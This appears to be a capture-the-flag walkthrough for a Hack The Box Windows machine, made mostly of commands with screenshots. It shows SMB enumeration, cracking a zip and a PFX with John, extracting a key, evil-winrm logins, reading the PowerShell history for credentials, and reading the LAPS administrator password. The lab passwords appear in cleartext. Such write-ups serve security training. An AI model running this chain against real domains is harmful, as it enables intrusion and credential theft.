```
smbclient -L \\\\10.10.11.152\\
smbclient \\\\10.10.11.152\\Shares
zip2john winrm_backup.zip > hash_zip
john hash_zip -w=/usr/share/wordlists/rockyou.txt
pfx2john legacyy_dev_auth.pfx > hash_pfx
john hash_pfx -w=/usr/share/wordlists/rockyou.txt
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
net user svc_deploy
upload AdmPwd.PS
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
evil-winrm -i 10.10.11.152 -S -u administrator -p 'A+@PQh;Cj0+{Cb2oBJBybYry'
```


```
nmap -sS -sC -sV -T5 -Pn 10.10.11.152
```
![image](https://github.com/regarmulia/HTB/assets/33616880/de39839c-7d0f-4e06-bce0-405c4fd5e9df)


```
smbclient -L \\\\10.10.11.152\\
smbclient \\\\10.10.11.152\\Shares
```
![image](https://github.com/regarmulia/HTB/assets/33616880/38dc3fff-aa4b-43ea-9708-623342572d32)


```
zip2john winrm_backup.zip > hash_zip
john hash_zip -w=/usr/share/wordlists/rockyou.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/2fd7c3da-dd7e-4873-a74d-5cb138de68ca)

![image](https://github.com/regarmulia/HTB/assets/33616880/25e93ff2-37af-438d-8e31-0bbac933bdfb)


```
pfx2john legacyy_dev_auth.pfx > hash_pfx
john hash_pfx -w=/usr/share/wordlists/rockyou.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ade0c972-88c1-45ae-b2fe-482b7f8a930c)


```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/07ffcc57-6bbb-4567-ad1e-38879504d66f)


```
evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
```
![image](https://github.com/regarmulia/HTB/assets/33616880/dbc9049b-bc5b-4ae5-bf13-61229ef18444)


```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/f6ebf0ae-9a32-4cdb-9a80-fd852960949d)


```
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
net user svc_deploy
upload AdmPwd.PS
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0eeb2fa9-09a1-4cc8-9c21-69219178b416)


```
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/27e1d01a-442f-4a88-89f8-08d0b427425b)


```
evil-winrm -i 10.10.11.152 -S -u administrator -p 'A+@PQh;Cj0+{Cb2oBJBybYry'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1b1a7314-434a-40e8-bca7-a9477253776c)
